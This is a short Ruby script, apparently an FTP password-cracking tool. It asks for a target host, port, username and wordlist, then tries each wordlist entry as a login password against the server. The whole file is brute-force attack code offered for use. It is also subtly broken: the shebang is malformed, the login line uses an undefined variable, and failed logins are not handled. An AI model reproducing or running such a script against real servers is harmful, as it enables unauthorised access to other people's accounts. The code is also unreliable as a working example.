#!/usr/bin/env/ruby

require './ftpcracker'

puts "Please enter a user name: "
user_name = gets.chomp.to_s

puts "Please enter the target host:"
ip_address = gets.chomp.to_s

puts "Please enter the target port"
port = gets.chomp.to_s

puts "\n"

puts "USER NAME: #{user_name}"
puts "IP ADDRESS: #{ip_address}"
puts "PORT: #{port}"

puts "Please enter a wordlists: "
password = gets.chomp.to_s


File.open(password).each do |line|
	ftp=Net::FTP.new
	ftp.connect(ip_address, port)
	puts "Trying Username: #{user_name} Password: #{line}"
	ftp.login(username, line)
end